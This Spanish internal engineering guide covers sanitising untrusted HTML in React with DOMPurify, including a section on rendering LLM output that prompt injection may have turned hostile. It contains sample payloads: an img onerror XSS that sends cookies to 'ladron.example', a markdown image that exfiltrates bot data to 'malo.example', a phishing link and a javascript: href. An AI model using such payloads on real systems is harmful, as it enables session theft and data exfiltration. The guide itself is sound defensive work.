# Saneado de HTML — patrón de casa

> Capa `saneado` del patrón de casa (DOMPurify 3). React escapa el texto por defecto, así que en una
> app React el XSS no aparece por descuido: aparece **por las dos puertas que el propio React deja
> abiertas**. Este documento es la lista de esas puertas y qué se pone en cada una.
> Comprobación: `python3 .claude/patterns/stack/pattern_check_frontend.py --only saneado`.

## La regla (una frase)

El HTML que no has escrito tú se pinta **solo** con `dangerouslySetInnerHTML`, **solo** después de
pasar por `DOMPurify.sanitize()`, y **en el momento de renderizar** — nunca al guardar.

## Implementación de referencia

**Qué es un XSS, en una frase y con un ejemplo.** *Cross-site scripting* es que un texto acabe
ejecutándose como código en el navegador de otra persona. Si un cliente escribe en el campo
"observaciones" el texto `<img src=x onerror="fetch('https://ladron.example/?c='+document.cookie)">`
y tu app lo pinta como HTML, ese código corre **con la sesión de quien esté mirando** — normalmente
alguien de tu equipo abriendo la ficha. No hace falta que el atacante entre en el sistema: le basta
con dejar el texto ahí y esperar.

**Lo que React ya hace gratis.** `<p>{comentario}</p>` nunca es un agujero: React convierte el texto
en texto, así que los `<` y `>` salen impresos en pantalla en lugar de interpretarse. Por eso el 95%
del código no necesita nada de este documento. Las puertas abiertas son dos: la propiedad
`dangerouslySetInnerHTML` —que se llama así a propósito, para que cueste escribirla— y salirse de
React para tocar el DOM a mano (`innerHTML`).

**El componente de casa** — `src/components/SafeHtml.tsx`. Un solo sitio donde vive el saneado, para
que no haya que acordarse en cada pantalla:

```tsx
import DOMPurify from 'dompurify';

export interface SafeHtmlProps {
  html: string;
  /** Etiquetas permitidas. Por defecto, texto con formato básico. */
  allowed?: string[];
}

const POR_DEFECTO = ['p', 'br', 'strong', 'em', 'u', 'ul', 'ol', 'li', 'a', 'h2', 'h3'];

export function SafeHtml({ html, allowed = POR_DEFECTO }: SafeHtmlProps) {
  const limpio = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowed,
    ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
  });
  return <div dangerouslySetInnerHTML={{ __html: limpio }} />;
}
```

Uso:

```tsx
<SafeHtml html={articulo.cuerpo} />
<SafeHtml html={aviso.texto} allowed={['strong', 'em', 'br']} />
```

Dos decisiones dentro de esas ocho líneas:

- **Lista blanca, no lista negra.** Se dice qué se permite, no qué se prohíbe. DOMPurify por defecto
  ya quita lo peligroso, pero una lista explícita y corta es más fácil de razonar y no envejece:
  cuando aparezca una etiqueta nueva y rara, no estará en la lista y ya está. Prohibir de una en una
  es una carrera que se pierde.
- **Se sanea al pintar, no al guardar.** Es la decisión que más gente hace al revés, y por eso está
  abajo con su propia explicación.

**Enlaces que vienen de datos.** Un `href` con el valor `javascript:alert(1)` ejecuta al hacer clic,
y eso pasa por delante de DOMPurify si el enlace lo construyes tú en JSX. Se valida el esquema
cuando el dato entra, con el mismo Zod que ya usan los formularios:

```ts
// src/features/links/schemas/link.ts
export const enlaceSchema = z.object({
  // z.url() comprueba que es una URL; el refine restringe el esquema a http y https,
  // que es lo que descarta javascript:, data: y file:
  url: z
    .url()
    .refine((u) => ['http:', 'https:'].includes(new URL(u).protocol), 'Solo se admiten enlaces http o https'),
  titulo: z.string().min(1),
});
```

**En el servidor.** DOMPurify necesita un DOM para trabajar, así que en Node no funciona tal cual:
hay que darle uno con `jsdom` (`createDOMPurify(new JSDOM('').window)`), o usar el envoltorio
`isomorphic-dompurify`. En una SPA con backend Django esto no aplica —todo el render es en el
navegador— pero conviene saberlo antes de mover un componente a un entorno con render de servidor.

## El antipatrón que sustituye

```tsx
// ❌ src/features/articles/components/ArticleBody.tsx
export function ArticleBody({ articulo }: { articulo: Articulo }) {
  return <div dangerouslySetInnerHTML={{ __html: articulo.cuerpo }} />;
}

// ❌ src/components/Tooltip.tsx
function mostrar(el: HTMLElement, contenido: string) {
  el.innerHTML = `<span class="tip">${contenido}</span>`;
}
```

- **`__html` directo desde la API** es el agujero completo, sin matices. Y el argumento que siempre
  aparece —"pero ese HTML lo escribe nuestro equipo en el gestor de contenidos, no un desconocido"—
  no aguanta: hoy ese campo lo llena un compañero, en seis meses lo llena una integración, una
  importación de un CSV o un cliente con acceso al panel. La confianza no viaja con el dato; solo
  viaja el texto.
- **`innerHTML` con una plantilla** se salta el escapado de React, que era justo lo que te protegía.
  Aquí `contenido` entra crudo en el marcado. Además rompe el modelo de React: ese nodo lo gestiona
  React, y al escribirle por debajo el siguiente re-render borra lo que hiciste, así que suele venir
  acompañado de bugs de pintado que nadie relaciona con esta línea.

Y el que parece bien hecho y es peor:

```ts
// ❌ al guardar
const limpio = DOMPurify.sanitize(entrada);
await articulosApi.create({ cuerpo: limpio });   // …y luego se pinta crudo
```

**Sanear al guardar suena más eficiente y tiene tres problemas.** El primero: cuando se descubra un
bypass y salga la versión corregida de DOMPurify, todo lo que ya está en la base de datos sigue
envenenado — saneaste con la versión de antes y esos registros nadie los vuelve a mirar. El segundo:
el original se ha perdido, así que no puedes reprocesarlos ni auditar qué llegó de verdad. El
tercero, el más práctico: en cuanto haya una segunda vía de entrada (un import, un endpoint
administrativo, una migración) que no pase por ese punto, hay datos sin sanear en una tabla que todo
el mundo cree limpia. Saneando al pintar, la garantía es de la pantalla y no depende de por dónde
entró el dato.

Guardar el original crudo y sanear al mostrarlo es la combinación correcta. Y no cuesta:
DOMPurify sanea una entrada normal en fracciones de milisegundo.

## Cómo se comprueba

```bash
python3 .claude/patterns/stack/pattern_check_frontend.py --only saneado
```

| id | estado | qué detecta |
|---|---|---|
| `fe-html-saneado` | activo | fichero con `dangerouslySetInnerHTML={` y sin ninguna mención a `DOMPurify` ni a una función `sanitize…(` |
| `fe-sin-innerhtml` | activo | `.innerHTML =`, `insertAdjacentHTML(` o `document.write(` en código de aplicación |

Las dos reglas exigen la **forma sintáctica completa**, no la palabra suelta, y en los dos casos
por un falso positivo real que apareció al probarlas contra este repo:

- `fe-html-saneado` pide el atributo JSX (`dangerouslySetInnerHTML={`). El nombre pelado aparece en
  prompts, checklists y documentación — el workflow `/review-branch` de este mismo repo lo cita como
  una de las cosas que hay que buscar en una revisión de seguridad, y marcar eso enseña al equipo a
  ignorar la regla.
- `fe-sin-innerhtml` deja pasar `.innerHTML = ''` (con comillas de cualquier tipo): vaciar un nodo
  no inyecta nada.

Las dos son **activas** —bloquean— y es de las pocas veces en este catálogo donde eso no se discute:
el coste de un falso positivo es escribir una línea de exención, y el de un falso negativo es un
XSS.

**La comprobación es de fichero, no de flujo.** `fe-html-saneado` verifica que el saneado *aparece*
en el mismo fichero, no que el valor concreto que llega a `__html` sea el que salió de
`DOMPurify.sanitize()`. Se puede engañar sin esfuerzo:

```tsx
const limpio = DOMPurify.sanitize(a);           // el comprobador ve DOMPurify y calla
<div dangerouslySetInnerHTML={{ __html: b }} /> // …pero aquí va la variable sin sanear
```

Seguir el valor exigiría análisis de flujo de datos, que no se hace con expresiones regulares. La
regla sirve para lo que sirve: hace **imposible el descuido** (escribir `__html` sin acordarse de
sanear) y deja fuera el error deliberado o rebuscado. Quien cubre esa parte es la revisión humana y
`sofia-pentester`. Por eso además existe `SafeHtml`: si el saneado vive en un componente y nadie
escribe `dangerouslySetInnerHTML` en otro sitio, no hay dónde equivocarse.

Refuerzo con herramientas que sí ven el AST:

- **ESLint** — `react/no-danger` (avisa de todo `dangerouslySetInnerHTML`, útil si quieres que solo
  exista en `SafeHtml.tsx`), `react/jsx-no-script-url` (caza `href="javascript:…"` literal) y
  `no-unsanitized/property` del plugin `eslint-plugin-no-unsanitized`, que sí sigue la asignación a
  `innerHTML` y es más fino que el comprobador.
- **`npm audit`** o Dependabot para enterarte de que ha salido una versión de DOMPurify con un
  bypass corregido. Este es el motivo real por el que se sanea al pintar.

**Lo que no se comprueba:** un `href={valor}` dinámico que apunte a `javascript:`. El caso literal
lo caza ESLint; el caso con variable no lo detecta nada estáticamente, y la defensa es la validación
de esquema con Zod de arriba.

## Salida del LLM: el modelo es un usuario más (OWASP LLM05, sub-ola 2.32, SE-33)

Todo lo de arriba habla del HTML que viene de un usuario. **El texto que escribe un modelo es lo mismo**:
con una inyección en el catálogo, en una reseña o en la foto que mandó el cliente, el modelo repite lo que
el atacante quiso. Un widget que pinta ese texto tiene DOS puertas que `DOMPurify` por sí solo no cierra,
porque el enlace y la imagen son HTML legítimo:

1. **El enlace.** Cualquier `https://` del modelo se vuelve clicable: `[confirma tu pedido](https://malo.example/login)`
   es phishing con la voz de tu bot. **Lista blanca de dominios** para los enlaces (el dominio exacto o un
   subdominio; ni `https://tienda.es@malo.example`, ni `tienda.es.malo.example`, ni `javascript:`/`data:`).
2. **La imagen.** `![](https://malo.example/p.png?d=<lo que sabe el bot>)` hace que el NAVEGADOR del cliente
   pida esa URL: exfiltra por la query string sin que nadie haga clic. **Sin imágenes remotas** en lo que
   pinta el modelo (si hace falta una imagen de producto, la pone el código desde el catálogo, no el texto).

```tsx
// widget: la MISMA regla que el servidor (`templates/canal-bot/enlaces_permitidos.py`), porque el servidor
// no controla qué cliente pinta lo que devuelve. El texto del modelo entra por aquí y por ningún otro sitio.
const DOMINIOS_PERMITIDOS = ["tienda.es"];                       // los del propio negocio y sus pasarelas
export function hostPermitido(url: string): boolean {
  try {
    const u = new URL(url);
    if (!["http:", "https:"].includes(u.protocol) || u.username || u.password) return false;
    return DOMINIOS_PERMITIDOS.some((d) => u.hostname === d || u.hostname.endsWith("." + d));
  } catch { return false; }
}
// react-markdown: sin <img>, y el <a> solo con host permitido (si no, el texto sin enlace)
<ReactMarkdown
  disallowedElements={["img", "iframe", "script", "style"]}
  components={{ a: ({ href, children }) => (href && hostPermitido(href)
    ? <a href={href} rel="noopener noreferrer nofollow" target="_blank">{children}</a>
    : <span>{children}</span>) }}
/>
```

Y la **CSP del widget** como segunda capa (si falla el filtro, el navegador no carga lo ajeno):
`default-src 'self'; img-src 'self' data:; connect-src <la API propia>; frame-src 'none'; object-src 'none'; base-uri 'none'`.

Cómo se comprueba: `templates/canal-bot/test_canal_bot.py` (enlaces de otro dominio, subdominios parecidos,
`userinfo`, esquemas raros, imágenes markdown y `<img>`). **Lo que no prueba**: el `format.ts` o el
componente de cada proyecto — hay que correr los mismos casos contra el render real del widget.

## Excepciones legítimas

- **HTML que genera la propia app** a partir de una plantilla que está en el repo (un email de
  previsualización, un fragmento montado en el código): no viene de fuera y no hay nada que sanear.
  Se exceptúa dejando escrito de dónde sale el HTML.
- **Una librería de terceros que escribe en el DOM** (un editor enriquecido, un mapa, un gráfico):
  usa `innerHTML` por dentro y es su trabajo. La regla no la ve porque está en `node_modules`; si el
  código de integración necesita tocar el nodo, se exceptúa nombrando la librería.
- **Marcado ya saneado en el servidor**, cuando el backend garantiza por contrato que ese campo sale
  limpio. Es una excepción de verdad y a la vez la que más veces se ha usado mal: exige que alguien
  pueda señalar **la línea del backend** que lo garantiza, no una costumbre.
- **`.innerHTML` para vaciar un nodo** — ya está exento en la propia regla.

```tsx
// pattern-exempt: fe-sin-innerhtml — lo escribe el editor TipTap sobre su propio nodo, no lo tocamos
```

Una excepción sin razón escrita no es una excepción, es un agujero con permiso.

## Related

- `frontend-stack.md` (por qué DOMPurify) · `rutas.md` (URLs que vienen de datos) ·
  `formularios.md` (Zod validando lo que entra) · `componentes.md`
- `rules/agent-security-bots.md` (el mapa de riesgos de los bots) · `templates/canal-bot/enlaces_permitidos.py`
- `rules/security.md` · agente `sofia-pentester` (quien lo prueba de verdad) · skill
  `code-review-gate` (el gate pre-merge ya mira `dangerouslySetInnerHTML`)
